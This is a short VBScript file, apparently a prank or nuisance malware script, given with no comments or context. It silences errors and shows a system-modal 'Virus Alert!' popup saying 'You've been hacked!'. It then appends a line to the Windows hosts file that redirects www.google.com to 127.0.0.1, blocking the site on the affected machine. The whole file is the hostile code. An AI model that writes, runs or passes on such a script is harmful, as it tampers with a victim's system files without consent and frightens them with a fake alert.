On Error Resume Next

Set objShell = CreateObject("Wscript.Shell")
strMessage = "You've been hacked!"
strTitle = "Virus Alert!"
intType = vbCritical + vbSystemModal
objShell.Popup strMessage, , strTitle, intType

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\Windows\System32\drivers\etc\hosts", 8, True)
objFile.WriteLine "127.0.0.1 www.google.com"
objFile.Close
